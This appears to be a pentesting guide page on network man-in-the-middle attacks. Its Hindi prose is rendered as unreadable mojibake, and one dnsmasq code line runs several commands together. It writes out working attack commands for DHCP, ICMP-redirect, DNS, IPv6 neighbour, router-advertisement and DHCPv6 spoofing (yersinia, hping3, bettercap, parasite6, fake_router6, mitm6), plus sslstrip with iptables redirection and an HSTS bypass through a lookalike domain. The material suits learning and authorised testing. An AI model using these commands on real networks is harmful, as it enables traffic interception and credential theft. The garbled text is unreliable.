[**FRRouting**](https://frrouting.org/) рдЖрдкрдХреЛ **BGP, OSPF, EIGRP, RIP рдФрд░ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдЖрднрд╛рд╕реА рд░рд╛рдЙрдЯрд░ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЖрдкрдХреЛ рдмрд╕ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рддреИрдирд╛рдд рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд░реВрдЯрд┐рдВрдЧ рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рд╡реИрдз рд░рд╛рдЙрдЯрд░ рд╣реЛрдиреЗ рдХрд╛ рдирд╛рдЯрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) EIGRP (Enhanced Interior Gateway Routing Protocol) рдкреНрд░рд╕рд╛рд░рдгреЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛рдПрдБ рд░рдЦрддрд╛ рд╣реИред рдпрд╣ рдкреИрдХреЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд░реВрдЯрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### OSPF

Open Shortest Path First (OSPF) рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ **рд░рд╛рдЙрдЯрд░ рдХреЗ рдмреАрдЪ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрдЪрд╛рд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдпрддрдГ MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЛ Loki рдФрд░ John the Ripper рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпреЗ рдЙрдкрдХрд░рдг MD5 рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреБрдВрдЬреА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рд░ рдЬрдм рдпрд╣ рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдИ рд░реВрдЯрд┐рдВрдЧ рдЬрд╛рдирдХрд╛рд░реА рдкреЗрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд░реВрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдФрд░ рд╕рдордЭреМрддрд╛ рдХреА рдЧрдИ рдХреБрдВрдЬреА рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, _Injection_ рдФрд░ _Connection_ рдЯреИрдм рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрд░рдорд╢рдГред

* **MD5 рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рдХреНрд░реИрдХ рдХрд░рдирд╛:** рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП Loki рдФрд░ John the Ripper рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд░реВрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛:** рдпрд╣ _Injection_ рдЯреИрдм рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд╕рдордЭреМрддрд╛ рдХреА рдЧрдИ рдХреБрдВрдЬреА рд╕реЗрдЯ рдХрд░рдирд╛:** рдХреБрдВрдЬреА _Connection_ рдЯреИрдм рдХреЗ рддрд╣рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛рддреА рд╣реИред

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* рдЖрдк **рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА** [**рдпрд╣рд╛рдБ**](https://github.com/Sab0tag3d/MITM-cheatsheet) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## **Spoofing**

рдЖрдХреНрд░рдордгрдХрд╛рд░реА рдирдП рдиреЗрдЯрд╡рд░реНрдХ рд╕рджрд╕реНрдп рдХреЗ рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдкреИрд░рд╛рдореАрдЯрд░ (GW, IP, DNS) рдХреЛ рдирдХрд▓реА DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect рдПрдХ ICMP рдкреИрдХреЗрдЯ рдкреНрд░рдХрд╛рд░ 1 рдХреЛрдб 5 рднреЗрдЬрдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдЬреЛ рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ IP рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рдкреАрдбрд╝рд┐рдд IP рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреИрдХреЗрдЯ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ред
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

рд╣рдорд▓рд╛рд╡рд░ рдХреБрдЫ (рдпрд╛ рд╕рднреА) рдбреЛрдореЗрди рдХреЛ рд╣рд▓ рдХрд░реЗрдЧрд╛ рдЬреЛ рдкреАрдбрд╝рд┐рдд рдкреВрдЫрддрд╛ рд╣реИред
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq рдХреЗ рд╕рд╛рде рдЕрдкрдирд╛ DNS рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### рд╕реНрдерд╛рдиреАрдп рдЧреЗрдЯрд╡реЗ

рд╕рд┐рд╕реНрдЯрдореЛрдВ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ рдХрдИ рдорд╛рд░реНрдЧ рд╣реЛрддреЗ рд╣реИрдВред рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ MAC рдкрддреЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, IPv4 рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _gateway-finder.py_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рд╕рдорд╛рдзрд╛рди рдХреЗ рд▓рд┐рдП рдЬрдм DNS рд▓реБрдХрдЕрдк рдЕрд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, Microsoft рд╕рд┐рд╕реНрдЯрдо **Link-Local Multicast Name Resolution (LLMNR)** рдФрд░ **NetBIOS Name Service (NBT-NS)** рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕реА рддрд░рд╣, **Apple Bonjour** рдФрд░ **Linux zero-configuration** рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ рд╕рд┐рд╕реНрдЯрдо рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **Multicast DNS (mDNS)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд░рд╣рд┐рдд рдкреНрд░рдХреГрддрд┐ рдФрд░ UDP рдкрд░ рдЙрдирдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рдХрд╛рд░рдг, рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдкреНрд░рд╕рд╛рд░рдг рдХрд░рддреЗ рд╣реБрдП, рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕реЗрд╡рд╛рдУрдВ рдХреА рдУрд░ рдореЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдирдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрдк Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЧрдИ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдирдХрд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬреА рдЬрд╛ рд╕рдХреЗрдВред\
рдпрд╣рд╛рдБ рдкрдврд╝реЗрдВ [рдХреИрд╕реЗ Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЖрдорддреМрд░ рдкрд░ **Web Proxy Auto-Discovery (WPAD) рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗрдВ**ред рдЗрд╕рдореЗрдВ рдПрдХ рд╕рд░реНрд╡рд░ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ URL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреИрд╕реЗ "http://wpad.example.org/wpad.dat"ред рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рдЗрд╕ рд╕рд░реНрд╡рд░ рдХреА рдЦреЛрдЬ рд╡рд┐рднрд┐рдиреНрди рддрдВрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛ рд╕рдХрддреА рд╣реИ:

* **DHCP** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬрд╣рд╛рдБ рдЦреЛрдЬ рдХреЛ рд╡рд┐рд╢реЗрд╖ рдХреЛрдб 252 рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдЧрдо рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **DNS** рджреНрд╡рд╛рд░рд╛, рдЬрд┐рд╕рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдХреЗ рднреАрддрд░ _wpad_ рд▓реЗрдмрд▓ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдЦреЛрдЬ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред
* **Microsoft LLMNR рдФрд░ NBT-NS** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬреЛ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдмреИрдХрдЕрдк рддрдВрддреНрд░ рд╣реИрдВ рдЬрд╣рд╛рдБ DNS рд▓реБрдХрдЕрдк рд╕рдлрд▓ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

рдЯреВрд▓ Responder рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ рдФрд░ рдПрдХ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг WPAD рд╕рд░реНрд╡рд░** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред рдпрд╣ DHCP, DNS, LLMNR, рдФрд░ NBT-NS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЕрдкрдиреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рднреНрд░рд╛рдордХ рдХрд░рддрд╛ рд╣реИред Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХреИрд╕реЗ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП [рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ред

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХреЗ рдХрд┐ рд╡рд╣ рдХреБрдЫ **рд╕рд╛рджрд╛-рдкрд╛рда рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рджрд░реНрдЬ рдХрд░реЗред **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)** рдореЗрдВред**

### IPv6 Neighbor Spoofing

рдпрд╣ рд╣рдорд▓рд╛ ARP Spoofing рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди IPv6 рджреБрдирд┐рдпрд╛ рдореЗрдВред рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдпрд╣ рд╕реЛрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ GW рдХрд╛ IPv6 рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ MAC рд╣реИред
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 рд░рд╛рдЙрдЯрд░ рд╡рд┐рдЬреНрдЮрд╛рдкрди рдзреЛрдЦрд╛рдзрдбрд╝реА/рдмрд╛рдврд╝

рдХреБрдЫ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП RA рдкреИрдХреЗрдЯреНрд╕ рд╕реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЧреЗрдЯрд╡реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ IPv6 рд░рд╛рдЙрдЯрд░ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ DHCPv6 рдкреИрдХреЗрдЯ рдкрдврд╝рдХрд░ DNS рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВред рдлрд┐рд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ DHCPv6 рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЦреБрдж рдХреЛ DNS рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗред DHCP рднреА рдкреАрдбрд╝рд┐рдд рдХреЛ рдПрдХ IPv6 рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ, рдпрд╣ рд╣рдорд▓рд╛ рдпрд╣ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдПрдХ **HTTP** рдкреГрд╖реНрда рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **HTTPS** рд╕рдВрд╕реНрдХрд░рдг рдХреА рдУрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реЛ рд░рд╣рд╛ рд╣реИред **sslStrip** **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде** рдПрдХ **HTTP рдХрдиреЗрдХреНрд╢рди** рдФрд░ **рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде** рдПрдХ **HTTPS рдХрдиреЗрдХреНрд╢рди** **рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛** рддрд╛рдХрд┐ рдпрд╣ **рд╕реНрдирд┐рдл** рдХрд░ рд╕рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ **рд╕рд╛рджрд╛ рдкрд╛рда** рдореЗрдВред
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ рдФрд░ dns2proxy рдХрд╛ рдЙрдкрдпреЛрдЧ HSTS рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

**sslStrip+ рдФрд░ dns2proxy** рдФрд░ **sslStrip** рдХреЗ рдмреАрдЪ рдХрд╛ **рдЕрдВрддрд░** рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ **рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП** _**www.facebook.com**_ рдХреЛ _**wwww.facebook.com**_ **рдкрд░** **рд░рд┐рдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдВрдЧреЗ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрддрд┐рд░рд┐рдХреНрдд** "**w**" рд╣реИ) рдФрд░ **рдЗрд╕ рдбреЛрдореЗрди рдХрд╛ рдкрддрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ IP рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВрдЧреЗ**ред рдЗрд╕ рддрд░рд╣, **рдХреНрд▓рд╛рдЗрдВрдЯ** _**wwww.facebook.com**_ **(рд╣рдорд▓рд╛рд╡рд░)** рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди рдкрд░реНрджреЗ рдХреЗ рдкреАрдЫреЗ **sslstrip+** **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХрдиреЗрдХреНрд╢рди** рдХреЛ https рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **www.facebook.com** рдХреЗ рд╕рд╛рде **рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛**ред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ **рд▓рдХреНрд╖реНрдп** HSTS рдХреЛ **рдЯрд╛рд▓рдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _**wwww**.facebook.com_ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ** **рдХреИрд╢** рдореЗрдВ **рд╕рд╣реЗрдЬрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ **HTTP рдореЗрдВ рдлреЗрд╕рдмреБрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ рдкрд╣рд▓реЗ [http://www.faceook.com](http://www.faceook.com) рдкрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рд╣реЛрдЧреА рдФрд░ рди рдХрд┐ https рдкрд░ред рдпрд╣ рдПрдХ http рдкреГрд╖реНрда рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдВрдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

